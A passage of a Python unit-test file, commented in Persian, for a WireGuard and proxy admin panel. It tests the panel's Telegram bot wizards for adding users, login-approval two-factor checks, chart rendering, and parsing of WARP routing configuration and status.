        # --- سمتِ ربات (_bu_roles) ---
        self.assertIn("admin", m.BOT._bu_roles("1"))      # مالک
        self.assertIn("admin", m.BOT._bu_roles("2"))      # مدیر
        self.assertNotIn("admin", m.BOT._bu_roles("3"))   # فقط bot.manage
        self.assertIn("helper", m.BOT._bu_roles("3"))     # نقشِ سفارشی آزاد
        self.assertIn("admin", m.BOT._bu_roles())         # بدونِ frm: مثلِ قبل

    def test_bot_wg_add_wizard(self):
        """ویزاردِ ساختِ کاربرِ وایرگارد در ربات: همه‌ی پارامترهای مودالِ وب
        (اینترفیس/نام/PSK/سهمیه/سقف‌کل/سرعت/انقضا) + اعمالِ متادیتا."""
        m = self.m
        m.CONFIG["bot"] = {"enabled": True,
                           "users": [{"id": "1", "role": "admin"}]}
        bot = m.BOT
        sent = []
        bot.send = lambda chat, text, kb=None: sent.append((text, kb))
        bot._send_wg_conf = lambda *a, **k: None
        m.server_ifaces = lambda: ["wg1udp", "wg2udp"]
        m.iface_subnet = lambda i: "192.168.188.0/24"
        bot._wg_find = lambda iface, name: None
        calls = {}
        m.add_peer = lambda iface, name, use_psk=True, overrides=None: (
            calls.update(iface=iface, name=name, psk=use_psk) or
            ({"name": name, "iface": iface, "ip": "192.168.188.5",
              "client_conf": "[Interface]"}, None))
        m.META.meta_update = lambda i, n, mf: calls.update(meta=dict(mf))
        m.SAMPLER.refresh_meta = lambda: None
        m.SHAPER.kick = lambda: calls.update(shaped=True)
        m.ALERTS.event = lambda *a, **k: None
        p = m.bot_perms("1")
        # مسیرِ کامل: اینترفیس → نام → PSK → سهمیه(فارسی) → سقف → سرعت → دائمی
        bot._start_wg_add(1, 1)
        self.assertEqual(bot.convo[1]["step"], "iface")   # ۲ اینترفیس → انتخاب
        bot._wg_add_cb(1, 1, "if|wg1udp", p)
        bot._convo_step(1, 1, "bad name!")                # نامِ نامعتبر رد شود
        self.assertEqual(bot.convo[1]["step"], "name")
        bot._convo_step(1, 1, "user01")
        bot._wg_add_cb(1, 1, "psk|1", p)
        bot._convo_step(1, 1, "۵۰")                       # ارقامِ فارسی
        bot._convo_step(1, 1, "200")
        bot._convo_step(1, 1, "20")
        bot._wg_add_cb(1, 1, "exp|-", p)                  # دائمی
        self.assertEqual(bot.convo[1]["step"], "confirm")
        bot._wg_add_cb(1, 1, "go", p)
        self.assertNotIn(1, bot.convo)                    # جلسه بسته شد
        self.assertEqual(calls["iface"], "wg1udp")
        self.assertEqual(calls["name"], "user01")
        self.assertTrue(calls["psk"])
        self.assertEqual(calls["meta"],
                         {"quota_gb": 50.0, "total_gb": 200.0,
                          "enforce_action": "disable", "rate_mbit": 20})
        self.assertTrue(calls.get("shaped"))              # SHAPER برای سرعت
        # تک‌اینترفیس → پرشِ مرحله‌ی انتخاب؛ لغو هم جلسه را ببندد
        m.server_ifaces = lambda: ["wg1udp"]
        bot._start_wg_add(1, 1)
        self.assertEqual(bot.convo[1]["step"], "name")
        bot._wg_add_cb(1, 1, "cancel", p)
        self.assertNotIn(1, bot.convo)
        # دکمه‌ی کهنه بعد از پایانِ جلسه → پیامِ راهنما، نه کرش
        bot._wg_add_cb(1, 1, "psk|1", p)
        self.assertIn("فعال نیست", sent[-1][0])
        # محدودسازی با bot.add_ifaces: از ۲ اینترفیس فقط wg1udp قابلِ انتخاب
        m.server_ifaces = lambda: ["wg1udp", "wg2udp"]
        m.CONFIG["bot"]["add_ifaces"] = ["wg1udp"]
        bot._start_wg_add(1, 1)
        self.assertEqual(bot.convo[1]["step"], "name")    # تک‌گزینه → پرشِ مرحله
        self.assertEqual(bot.convo[1]["iface"], "wg1udp")
        bot.convo[1]["step"] = "iface"                    # دکمه‌ی جعلیِ wg2udp رد شود
        bot._wg_add_cb(1, 1, "if|wg2udp", p)
        self.assertNotEqual(bot.convo.get(1, {}).get("iface"), "wg2udp")
        bot.convo.pop(1, None)

    def test_bot_px_add_wizard(self):
        """ویزاردِ ساختِ کاربرِ پروکسی در ربات: هر دو مسیرِ «با رمز» و
        «بدونِ‌رمز (IP-محور)» با همه‌ی پارامترهای مودالِ وب."""
        m = self.m
        m.CONFIG["bot"] = {"enabled": True,
                           "users": [{"id": "1", "role": "admin"}]}
        bot = m.BOT
        sent = []
        bot.send = lambda chat, text, kb=None: sent.append((text, kb))
        bot.send_photo = lambda *a, **k: None
        m.PROXY.kick = lambda: None
        p = m.bot_perms("1")
        # مسیرِ «با رمز»: نام → رمزِ دستی → سرعت(فارسی) → سهمیه → پروتکل →
        # IP آزاد → دائمی → ساخت
        bot._start_px_add(1, 1)
        bot._convo_step(1, 1, "pxuser1")
        bot._px_add_cb(1, 1, "auth|0", p)
        bot._convo_step(1, 1, "abc")                  # رمزِ کوتاه رد شود
        self.assertEqual(bot.convo[1]["step"], "pass")
        bot._convo_step(1, 1, "secret9")
        bot._convo_step(1, 1, "۲۰")                   # ارقامِ فارسی
        bot._convo_step(1, 1, "50")
        bot._px_add_cb(1, 1, "proto|https", p)
        bot._px_add_cb(1, 1, "src|-", p)              # بدونِ محدودیتِ مبدأ
        bot._px_add_cb(1, 1, "exp|-", p)              # دائمی
        self.assertEqual(bot.convo[1]["step"], "confirm")
        bot._px_add_cb(1, 1, "go", p)
        self.assertNotIn(1, bot.convo)
        u = m.META.proxy_user_get("pxuser1")
        self.assertIsNotNone(u, "کاربر ساخته نشد: %s" % (sent[-1:],))
        # نوعِ سرویس ترجمه شود، نه کلیدِ خامِ bot.proto.* در پیش‌نمایش/پیام
        self.assertFalse([t for t, _ in sent if "bot.proto." in t],
                         "کلیدِ خامِ bot.proto.* به کاربر رسید")
        self.assertEqual(u["rate_kbit"], 20000)       # Mbit → kbit
        self.assertEqual(u["quota_gb"], 50.0)
        self.assertEqual(u["protocol"], "https")
        self.assertEqual(u["noauth"], 0)
        self.assertEqual(u["pass_plain"], "secret9")
        self.assertEqual(u["expires"], "")
        # مسیرِ «بدونِ‌رمز»: IP اجباری است و مرحله‌ی رمز رد می‌شود
        bot._start_px_add(1, 1)
        bot._convo_step(1, 1, "pxnoauth")
        bot._px_add_cb(1, 1, "auth|1", p)
        self.assertEqual(bot.convo[1]["step"], "rate")   # پرشِ مرحله‌ی رمز
        bot._px_add_cb(1, 1, "rate|-", p)
        bot._px_add_cb(1, 1, "quota|-", p)
        bot._px_add_cb(1, 1, "proto|both", p)
        bot._px_add_cb(1, 1, "src|-", p)              # ردِ IP ممنوع → همان مرحله
        self.assertEqual(bot.convo[1]["step"], "src")
        bot._convo_step(1, 1, "bad-ip!")              # نامعتبر رد شود
        self.assertEqual(bot.convo[1]["step"], "src")
        bot._convo_step(1, 1, "5.114.20.10, 2.190.0.0/16")
        bot._px_add_cb(1, 1, "exp|-", p)
        bot._px_add_cb(1, 1, "go", p)
        u = m.META.proxy_user_get("pxnoauth")
        self.assertEqual(u["noauth"], 1)
        self.assertEqual(u["pass_hash"], "")
        self.assertIn("2.190.0.0/16", u["allow_src"])
        # تداخلِ رنجِ بدونِ‌رمز با کاربرِ بدونِ‌رمزِ موجود رد شود
        bot._start_px_add(1, 1)
        bot._convo_step(1, 1, "pxnoauth2")
        bot._px_add_cb(1, 1, "auth|1", p)
        bot._px_add_cb(1, 1, "rate|-", p)
        bot._px_add_cb(1, 1, "quota|-", p)
        bot._px_add_cb(1, 1, "proto|both", p)
        bot._convo_step(1, 1, "2.190.5.5")            # داخلِ رنجِ pxnoauth
        self.assertEqual(bot.convo[1]["step"], "src") # رد شد، همان مرحله
        self.assertIn("تداخل", sent[-1][0])
        bot._px_add_cb(1, 1, "cancel", p)
        self.assertIsNone(m.META.proxy_user_get("pxnoauth2"))
        # هیچ پیامی از ویزارد (پیش‌نمایش، ساخت، خطا) کلیدِ خامِ i18n نشان ندهد
        for text, _kb in sent:
            self.assertIsNone(re.search(r"\bbot\.[a-z_]+\.[a-z_0-9]+", text),
                              text)

    def test_fa_digits_en(self):
        m = self.m
        self.assertEqual(m._fa_digits_en("۵۰"), "50")
        self.assertEqual(m._fa_digits_en("۱٫۵"), "1.5")
        self.assertEqual(m._fa_digits_en("2026-01-01"), "2026-01-01")

    def test_render_chart_png_valid(self):
        m = self.m
        # دو سری + برچسبِ محور + راهنما + میله‌ای
        png = m.render_chart_png(
            [([10, 50, 30, 90], (63, 185, 80), "RX"),
             ([5, 20, 15, 40], (88, 166, 255), "TX")],
            x_labels=[(0.0, "07-18"), (0.5, "07-19"), (1.0, "07-20")],
            title="7D", bars=True)
        self.assertEqual(png[:8], b"\x89PNG\r\n\x1a\n")
        self.assertGreater(len(png), 500)
        # سریِ خالی هم نباید کرش کند
        self.assertEqual(m.render_chart_png([([], (1, 2, 3), "")])[:8],
                         b"\x89PNG\r\n\x1a\n")
        # فونت: عرضِ متن مثبت و draw_text بدونِ خطا
        self.assertGreater(m._text_w("MB", 2), 0)

    def test_chart_font_covers_caller_literals(self):
        """هر نویسه‌ی عنوان/راهنمای ثابتی که به render_chart_png داده می‌شود
        باید در _FONT5x7 گلیف داشته باشد؛ وگرنه جای خالی رسم می‌شود
        (باگِ قبلی: DOWN → «D W» و UP → خالی)."""
        m = self.m
        font = m._FONT5x7
        for ch, rows in font.items():
            self.assertEqual(len(rows), 7, ch)
            self.assertTrue(all(0 <= r < 32 for r in rows), ch)
        # ثابت‌های رشته‌ای داخلِ هر فراخوانیِ render_chart_png در کد
        tree = ast.parse(_read_panel_source())
        spec = re.compile(r"%[-#0 +]*\d*(?:\.\d+)?[sdif]")
        literals = set()
        for node in ast.walk(tree):
            if (isinstance(node, ast.Call)
                    and getattr(node.func, "id", None) == "render_chart_png"):
                parts = list(node.args) + [k.value for k in node.keywords]
                for part in parts:
                    for sub in ast.walk(part):
                        if (isinstance(sub, ast.Constant)
                                and isinstance(sub.value, str)):
                            literals.add(spec.sub("", sub.value))
        # گارد: پارسِ AST واقعاً فراخوانی‌ها را پیدا کرده باشد
        for must in ("DOWN", "UP", "SPEEDTEST - 7D", "TOP USERS - 7D",
                     "TOTAL/DAY", "RX", "TX"):
            self.assertIn(must, literals)
        # عنوانِ بازه‌ها (RANGES) و برچسب‌های محورِ Y هم روی تصویر می‌آیند
        literals.update(r[2] for r in m.TelegramBot.RANGES)
        literals.update(m._fmt_bytes_ascii(v) for v in (0, 5, 5e3, 5e6, 5e9, 5e12))
        literals.update(m._fmt_mbps_ascii(v) for v in (0, 0.5, 95, 1500))
        for text in literals:
            missing = [ch for ch in text.upper() if ch not in font]
            self.assertEqual(missing, [], "no glyph for %r in %r"
                             % (missing, text))
        # نامِ کاربر (ascii) روی محورِ X می‌آید → کلِ ASCIIِ چاپی
        missing = [chr(c) for c in range(32, 127)
                   if chr(c).upper() not in font]
        self.assertEqual(missing, [])

    def test_speed_chart_y_labels_are_mbps(self):
        """نمودارهای تستِ سرعت (ربات و گزارشِ دوره‌ای) مقدارِ Mbit/s دارند؛
        برچسبِ محورِ Y نباید واحدِ بایت (مثلِ «95 B») داشته باشد."""
        m = self.m
        now = time.time()
        for i, (dn, up) in enumerate(((95e6, 40e6), (380e6, 120e6),
                                      (240e6, 90e6))):
            m.META.speedtest_add({"ts": now - 3600 * (i + 1), "iface": "awgx",
                                  "server_id": 1, "ping_ms": 20.0,
                                  "down_bps": dn, "up_bps": up, "ok": 1,
                                  "error": ""})
        calls = []
        real_render = m.render_chart_png
        real_ifaces = m.SPEEDTEST.ifaces
        orig_api = m.tg_api

        def spy(series, **kw):
            calls.append((series, kw))
            return real_render(series, **kw)
        m.render_chart_png = spy
        m.SPEEDTEST.ifaces = lambda: ["awgx"]
        m.tg_api = lambda *a, **k: (True, {})
        try:
            bot = m.TelegramBot()
            bot.send_photo = lambda *a, **k: None
            bot._speed_graph("1")
            m.build_report_photos()
        finally:
            m.render_chart_png = real_render
            m.SPEEDTEST.ifaces = real_ifaces
            m.tg_api = orig_api
        speed = [(s, kw) for s, kw in calls
                 if any(name == "DOWN" for _, _, name in s)]
        self.assertEqual(len(speed), 2, calls)      # ربات + گزارش
        byte_unit = re.compile(r"\b[KMGT]?B\b")
        for series, kw in speed:
            mx, labels = m._chart_y_labels(series, kw.get("y_fmt"))
            self.assertAlmostEqual(mx, 380.0)
            for lbl in labels:
                self.assertIsNone(byte_unit.search(lbl), labels)
                self.assertIn("bit/s", lbl)
            self.assertEqual(labels[0], "380 Mbit/s")
        # پیش‌فرض (نمودارهای حجم) همچنان بایت است
        _, labels = m._chart_y_labels([([2048], (1, 2, 3), "RX")])
        self.assertEqual(labels[0], "2.0 KB")

    def test_fmt_bytes_srv(self):
        m = self.m
        # خروجی با ارقامِ فارسی و ممیزِ فارسی (قالبِ نمایشیِ ربات)
        self.assertEqual(m.fmt_bytes_srv(0), "۰ B")
        self.assertEqual(m.fmt_bytes_srv(1536), "۱٫۵ KB")
        self.assertEqual(m.fmt_bytes_srv(5 * 1024 ** 3), "۵٫۰ GB")

    def test_bot_endpoint_in_perm_map(self):
        H = self.m.Handler
        self.assertEqual(H.PERM_MAP.get("/api/bot/save"), "bot.manage")
        self.assertIn("bot.manage", self.m.ALL_PERMS)

    def test_parse_expiry_input(self):
        m = self.m
        b = m.BOT
        # تاریخِ صریح
        self.assertEqual(b._parse_expiry_input("2027-03-21", {}), "2027-03-21")
        # عددِ روز از امروز
        import datetime as _dt
        exp = (_dt.datetime.now() + _dt.timedelta(days=30)).strftime("%Y-%m-%d")
        self.assertEqual(b._parse_expiry_input("30", {}), exp)
        # عددِ روز روی انقضای آینده انباشته می‌شود
        future = (_dt.datetime.now() + _dt.timedelta(days=100)).strftime("%Y-%m-%d")
        got = b._parse_expiry_input("10", {"_curexp": future})
        exp2 = (_dt.datetime.strptime(future, "%Y-%m-%d")
                + _dt.timedelta(days=10)).strftime("%Y-%m-%d")
        self.assertEqual(got, exp2)
        # نامعتبر
        self.assertIsNone(b._parse_expiry_input("abc", {}))
        # 🪤 ارقامِ فارسی: \d آن‌ها را می‌گرفت و «۲۰۲۷-۰۳-۲۱» بی‌تبدیل ذخیره
        # می‌شد؛ اعمالِ انقضا مقایسه‌ی رشته‌ای با تاریخِ لاتین است و کاربر
        # هرگز منقضی نمی‌شد.
        self.assertEqual(b._parse_expiry_input("۲۰۲۷-۰۳-۲۱", {}), "2027-03-21")
        self.assertEqual(b._parse_expiry_input("۳۰", {}), exp)
        # تاریخِ بدشکلِ ولی عددی هم رد شود
        self.assertIsNone(b._parse_expiry_input("2027-13-45", {}))

    def test_input_step_normalises_persian_digits(self):
        m = self.m
        b = m.BOT
        sent = []
        b.send = lambda chat, text, kb=None, **kw: sent.append(text)
        asked = []
        b._ask_confirm = lambda frm, chat, st, summary: asked.append(st)
        st = {"kind": "px", "act": "ren", "name": "nobody"}
        b._input_step("1", "1", st, "۲۰۲۷-۰۳-۲۱", set())
        self.assertEqual(asked and asked[0]["val"], "2027-03-21")

    def test_bot_commands_defined(self):
        # اطمینان از اینکه ثبتِ دستور خطای ساختاری ندارد (بدون شبکه)
        m = self.m
        m.CONFIG["bot"] = {"enabled": False, "users": []}
        m.bot_setcommands()   # چون enabled=False زودبازمی‌گردد، بی‌خطا

    def test_build_digest_text(self):
        m = self.m
        m.CONFIG.setdefault("alerts", {})
        # SAMPLER در تست ماک است؛ build_stats را با داده‌ی نمونه جایگزین کن
        m.build_stats = lambda: {"users": [
            {"iface": "wg1udp", "name": "a", "online": True, "rx": 0, "tx": 0},
            {"iface": "wg1udp", "name": "b", "online": False, "rx": 0, "tx": 0}]}
        txt = m.build_digest_text()          # نباید کرش کند
        self.assertIn("خلاصه", txt)
        self.assertIn("وایرگارد", txt)
        self.assertIn("آنلاین", txt)
        self.assertIn("پروکسی", txt)

    def test_login2fa_enabled_gate(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "", "chat_id": ""}
        m.CONFIG["login_2fa"] = {"enabled": True}
        self.assertFalse(m.login2fa_enabled())        # بدون توکن → خاموش
        m.CONFIG["alerts"] = {"bot_token": "x", "chat_id": "1"}
        self.assertTrue(m.login2fa_enabled())
        m.CONFIG["login_2fa"] = {"enabled": False}
        self.assertFalse(m.login2fa_enabled())

    def test_login_approval_mechanism(self):
        """مکانیزمِ کاملِ تأییدِ ورود بدونِ تلگرام: ارسال (ماک) → انتظار →
        رزولوِ نخِ دیگر → بازگشتِ درست. هم مسیرِ تأیید هم رد."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "x", "chat_id": "1"}
        m.CONFIG["login_2fa"] = {"enabled": True}
        m._login_approvals.clear()
        orig_api = m.tg_api
        m.tg_api = lambda *a, **k: (True, {})   # ماکِ ارسالِ موفق
        try:
            def responder(approve):
                for _ in range(200):
                    with m._login_appr_lock:
                        toks = list(m._login_approvals.keys())
                    if toks:
                        m.resolve_login_approval(toks[0], approve)
                        return
                    time.sleep(0.02)
            t = threading.Thread(target=responder, args=(True,))
            t.start()
            ok = m.request_login_approval("u", "1.2.3.4")
            t.join()
            self.assertTrue(ok)                 # تأیید شد
            t2 = threading.Thread(target=responder, args=(False,))
            t2.start()
            ok2 = m.request_login_approval("u", "1.2.3.4")
            t2.join()
            self.assertFalse(ok2)               # رد شد
        finally:
            m.tg_api = orig_api
        # اگر ارسال شکست بخورد → False (پیش‌فرضِ امن)
        m.tg_api = lambda *a, **k: (False, "err")
        try:
            self.assertFalse(m.request_login_approval("u", "1.2.3.4"))
        finally:
            m.tg_api = orig_api

    def test_login2fa_needs_running_bot(self):
        """تپِ تأیید را نخِ ربات پردازش می‌کند؛ ۲مرحله‌ای بدونِ رباتِ روشن
        یعنی قفل‌شدنِ همه — هر دو طرفِ گارد باید بسته باشد."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "x",
                              "chat_id": "999"}
        m.CONFIG["bot"] = {"enabled": False, "users": []}
        m.CONFIG["login_2fa"] = {"enabled": True}
        # با رباتِ خاموش، هیچ callbackای پردازش نمی‌شود: ربات اصلاً
        # getUpdates نمی‌زند (شرطِ داخلِ حلقه)
        self.assertFalse(m.bot_cfg()["enabled"])
        # و login2fa_enabled همچنان True است یعنی ورود رد می‌شود (fail-closed)
        self.assertTrue(m.login2fa_enabled())

    def test_parse_login_chat(self):
        """چتِ تأییدِ ورود: خالی مجاز، مثبت مجاز، گروه/غیرعددی رد."""
        m = self.m
        self.assertEqual(m.parse_login_chat(""), ("", None))
        self.assertEqual(m.parse_login_chat("  123456789 "),
                         ("123456789", None))
        for bad in ("-1001234", "abc", "12 34", "۱۲۳"):
            val, err = m.parse_login_chat(bad)
            self.assertEqual(val, "")
            self.assertTrue(err, "باید رد شود: %r" % bad)

    def test_login_approval_goes_to_user_chat(self):
        """درخواستِ تأیید به چتِ خودِ کاربر می‌رود؛ بدونِ آن، به چتِ اصلی."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "x",
                              "chat_id": "999"}
        m.CONFIG["login_2fa"] = {"enabled": True}
        m._login_approvals.clear()
        sent = []
        orig_api = m.tg_api

        def fake_api(token, method, params=None, **k):
            sent.append((params or {}).get("chat_id"))
            return True, {}

        def responder(approve):
            for _ in range(200):
                with m._login_appr_lock:
                    toks = list(m._login_approvals.keys())
                if toks:
                    m.resolve_login_approval(toks[0], approve)
                    return
                time.sleep(0.02)

        m.tg_api = fake_api
        try:
            t = threading.Thread(target=responder, args=(True,))
            t.start()
            m.request_login_approval({"username": "op", "tg_chat": "555"},
                                     "1.2.3.4")
            t.join()
            self.assertEqual(sent, ["555"])         # چتِ خودِ کاربر
            sent.clear()
            t = threading.Thread(target=responder, args=(True,))
            t.start()
            m.request_login_approval({"username": "op", "tg_chat": ""},
                                     "1.2.3.4")
            t.join()
            self.assertEqual(sent, ["999"])         # چتِ اصلی
            self.assertEqual(m.user_login_chat({"tg_chat": "555"}), "555")
            self.assertEqual(m.user_login_chat({}), "999")
        finally:
            m.tg_api = orig_api

    def test_login_approval_falls_back_when_user_chat_unreachable(self):
        """اگر چتِ شخصی در دسترس نباشد، به چتِ اصلی برمی‌گردد (ضدِ قفل‌شدن)."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "x",
                              "chat_id": "999"}
        m._login_approvals.clear()
        sent = []
        orig_api = m.tg_api

        def fake_api(token, method, params=None, **k):
            chat = (params or {}).get("chat_id")
            sent.append(chat)
            return (chat != "555"), "blocked"    # چتِ شخصی جواب نمی‌دهد

        def responder():
            for _ in range(200):
                with m._login_appr_lock:
                    toks = list(m._login_approvals.keys())
                if toks:
                    m.resolve_login_approval(toks[0], True)
                    return
                time.sleep(0.02)

        m.tg_api = fake_api
        try:
            t = threading.Thread(target=responder)
            t.start()
            ok = m.request_login_approval({"username": "op",
                                           "tg_chat": "555"}, "1.2.3.4")
            t.join()
            self.assertTrue(ok)
            self.assertEqual(sent, ["555", "999"])   # اول شخصی، بعد اصلی
        finally:
            m.tg_api = orig_api

    def test_login_approval_callback_is_bound_to_dest_chat(self):
        """فقط از همان چتی که پیام به آن رفته می‌توان تأیید کرد."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "x",
                              "chat_id": "999"}
        m.CONFIG["bot"] = {"enabled": True,
                           "users": [{"id": "777", "role": "admin"}]}
        m._login_approvals.clear()
        orig_api = m.tg_api
        m.tg_api = lambda *a, **k: (True, {})
        bot = m.TelegramBot()
        answers = []
        bot.answer_cb = lambda cid, text="": answers.append(text)
        try:
            with m._login_appr_lock:
                m._login_approvals["T1"] = {"state": "pending",
                                            "ts": time.time(),
                                            "chat": "555", "user": "op"}

            def cb(frm, chat):
                return {"id": "c", "data": "lg:ok:T1",
                        "message": {"message_id": 1, "chat": {"id": chat}}}

            # ادمینِ ربات از چتِ خودش (نه چتِ مقصد) → رد
            bot._on_login_approval("777", cb("777", "777"))
            with m._login_appr_lock:
                self.assertEqual(m._login_approvals["T1"]["state"], "pending")
            self.assertTrue(answers and "مجاز" in answers[-1])
            # چتِ اصلی هم نمی‌تواند ورودی که به چتِ شخصی رفته را تأیید کند
            bot._on_login_approval("999", cb("999", "999"))
            with m._login_appr_lock:
                self.assertEqual(m._login_approvals["T1"]["state"], "pending")
            # صاحبِ چتِ مقصد → تأیید می‌شود
            bot._on_login_approval("555", cb("555", "555"))
            with m._login_appr_lock:
                self.assertEqual(m._login_approvals["T1"]["state"], "approved")
            # توکنِ ناشناس/منقضی → فقط پیامِ انقضا، بدونِ خطا
            answers.clear()
            bot._on_login_approval("555",
                                   {"id": "c", "data": "lg:ok:NOPE",
                                    "message": {"message_id": 1,
                                                "chat": {"id": "555"}}})
            self.assertTrue(answers and "منقضی" in answers[-1])
        finally:
            m.tg_api = orig_api


class WarpAutodetectStateTests(unittest.TestCase):
    """خواندنِ نتیجه‌ی کشفِ خودکار — سرویسی بیرون از پنل که فهرستِ مقصدها را
    خودش تغییر می‌دهد، پس پنل/ربات باید بتواند بی‌سروصدا نبودنش را تحمل کند
    و در صورتِ وجود، درست نشانش دهد."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.f = os.path.join(self.tmp, "autodetect.state")
        self.m.WARP_AUTODETECT_STATE = self.f

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_missing_file_is_not_an_error(self):
        """سرویس ممکن است اصلاً نصب نباشد — باید {} بدهد نه استثنا."""
        self.assertEqual(self.m.warp_autodetect_state(), {})

    def test_corrupt_json_is_tolerated(self):
        """نیمه‌نوشته/خراب هم نباید صفحه‌ی ربات را بشکند."""
        with open(self.f, "w", encoding="utf-8") as fh:
            fh.write("{not json")
        self.assertEqual(self.m.warp_autodetect_state(), {})

    def test_non_dict_json_rejected(self):
        with open(self.f, "w", encoding="utf-8") as fh:
            fh.write("[1, 2, 3]")
        self.assertEqual(self.m.warp_autodetect_state(), {})

    def test_reads_real_shape(self):
        """ساختارِ واقعیِ نوشته‌شده توسط warp-autodetect.py."""
        payload = {
            "ts": 1784884040, "checked": 25,
            "added": ["chromesyncpasswords-pa.googleapis.com"],
            "blocked": [{"sni": "chromesyncpasswords-pa.googleapis.com",
                         "bytes": 3620464, "conns": 60,
                         "iran": "403", "warp": "404"}],
            "dry_run": False,
        }
        with open(self.f, "w", encoding="utf-8") as fh:
            self.m.json.dump(payload, fh)
        got = self.m.warp_autodetect_state()
        self.assertEqual(got.get("checked"), 25)
        self.assertEqual(got.get("added"), payload["added"])
        self.assertEqual(got["blocked"][0]["iran"], "403")


class WarpStatusTests(unittest.TestCase):
    """وضعیتِ WARP در پنل: پارسِ پیکربندی از sync.sh + گردآوریِ زنده."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.sync = os.path.join(self.tmp, "sync.sh")
        self.m.WARP_SYNC = self.sync

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write_sync(self):
        with open(self.sync, "w", encoding="utf-8") as f:
            f.write(
                "#!/bin/bash\n"
                "WARP_EP=162.159.192.1\n"
                "EGRESS=wg22\n"
                "USERS=192.168.0.0/16\n"
                "RESOLVER=2.2.2.2\n"
                "EGRESS_FALLBACK=wg21\n"
                "DOMAINS=(\n"
                "  gemini.google.com\n"
                # کامنتِ حاویِ پرانتز — باگِ واقعی: مرزِ آرایه را زود می‌بست
                "  notebooklm.google            # لندینگ (216.239.32.x)\n"
                "  notebooklm.google.com        # اپِ اصلی (172.217.171.x)\n"
                ")\n"
                "STATIC_NETS=(1.2.3.4 5.6.7.0/24)\n")

    def test_parse_sync_config(self):
        """دامنه‌ها/IPها و کلیدها از خودِ sync.sh خوانده شوند؛ کامنت نادیده."""
        m = self.m
        self._write_sync()
        doms, static, cfg = m.warp_sync_config()
        self.assertEqual(doms, ["gemini.google.com", "notebooklm.google",
                                "notebooklm.google.com"])
        self.assertEqual(static, ["1.2.3.4", "5.6.7.0/24"])
        self.assertEqual(cfg["egress"], "wg22")
        self.assertEqual(cfg["warp_ep"], "162.159.192.1")
        self.assertEqual(cfg["users"], "192.168.0.0/16")
        self.assertEqual(cfg["resolver"], "2.2.2.2")
        # کامنت‌ها نباید به‌عنوان دامنه بیایند
        for d in doms:
            self.assertFalse(d.startswith("#"))
            self.assertNotIn("لندینگ", d)
        # رگرسیون: کامنتِ حاویِ «)» نباید آرایه را زود ببندد و دامنه گم کند
        self.assertIn("notebooklm.google.com", doms)
        # کلیدِ هم‌پیشوند (EGRESS_FALLBACK) نباید با EGRESS اشتباه شود
        self.assertEqual(cfg["egress"], "wg22")

    def test_monotonic_timer_conversion(self):
        """تایمرِ OnBootSec مبنای مونوتونیک دارد؛ باید به زمانِ واقعی تبدیل شود.
        (/proc/uptime فقط روی لینوکس هست، پس ماک می‌شود تا تست پلتفرم‌مستقل بماند.)"""
        m = self.m
        up = 27936.26                      # uptime فرضی
        real_open = builtins.open

        def fake_open(path, *a, **k):
            if path == "/proc/uptime":
                return io.StringIO("%s 100000.0\n" % up)
            return real_open(path, *a, **k)
        builtins.open = fake_open
        try:
            now = time.time()
            # ۱۰ دقیقه بعد از الان = uptime + 600
            t = up + 600
            val = "%dh %dmin %.2fs" % (t // 3600, (t % 3600) // 60, t % 60)
            got = m._monotonic_to_epoch(val)
            self.assertIsNotNone(got)
            self.assertAlmostEqual(got, now + 600, delta=5)
            # میکروثانیه‌ی خام هم پشتیبانی شود
            raw = m._monotonic_to_epoch(str(int((up + 300) * 1e6)))
            self.assertAlmostEqual(raw, now + 300, delta=5)
            # ورودی‌های بی‌معنی → None
            for bad in ("", "n/a", "0", "infinity", None):
                self.assertIsNone(m._monotonic_to_epoch(bad))
        finally:
            builtins.open = real_open

    def test_status_when_not_installed(self):
        m = self.m
        m.WARP_SYNC = os.path.join(self.tmp, "nope.sh")
        m._WARP_CACHE.update(ts=0, data=None)
        d = m.warp_status(force=True)
        self.assertFalse(d["installed"])
        self.assertFalse(d["healthy"])

    def test_status_reads_targets_file_not_script(self):
        """رگرسیون: مقصدها باید از targets.conf بیایند نه از آرایه‌های sync.sh
        (که حالا داینامیک‌اند و خالی به‌نظر می‌رسند)."""
        m = self.m
        self._write_sync()
        m.WARP_TARGETS = os.path.join(self.tmp, "targets.conf")
        with open(m.WARP_TARGETS, "w", encoding="utf-8") as f:
            f.write("# مدیریت‌شده از پنل\ngemini.google.com\n"
                    "notebooklm.google.com\n9.9.9.0/24\n")
        m._WARP_CACHE.update(ts=0, data=None)
        m.live_interfaces = lambda: []
        m.run = lambda cmd, timeout=20: (0, "", "")
        m._unit_props = lambda u, p: {}
        d = m.warp_status(force=True)
        self.assertEqual(d["domains"],
                         ["gemini.google.com", "notebooklm.google.com"])
        self.assertEqual(d["static_nets"], ["9.9.9.0/24"])

    def test_status_gathers_live_state(self):
        """ipset/قواعد/سرویس از خروجیِ دستورها درست استخراج شوند."""
        m = self.m
        self._write_sync()
        m._WARP_CACHE.update(ts=0, data=None)
        # نوعِ حساب حالا از فایل خوانده می‌شود (sync.sh می‌نویسدش)
        m.WARP_ACCOUNT_FILE = os.path.join(self.tmp, "warp-account")
        with open(m.WARP_ACCOUNT_FILE, "w") as f:
            f.write("unlimited\n")
        m.live_interfaces = lambda: ["wgwarp"]
        m.tunnel_rx_rate = lambda i: 1234.0
        now = int(time.time())

        def fake_run(cmd, timeout=20):
            c = " ".join(cmd)
            if cmd[:2] == ["wg", "show"]:
                return 0, ("privkey\tpubkey\t51820\toff\n"
                           "peerkey\t(none)\t162.159.192.1:2408\t0.0.0.0/0\t"
                           "%d\t5000\t9000\t25\n" % (now - 20)), ""
            if cmd[0] == "ipset":
                return 0, ("create ai_warp hash:net\n"
                           "add ai_warp 142.251.150.0/24\n"
                           "add ai_warp 216.239.32.0/24\n"), ""
            if c.startswith("iptables -t mangle -S"):
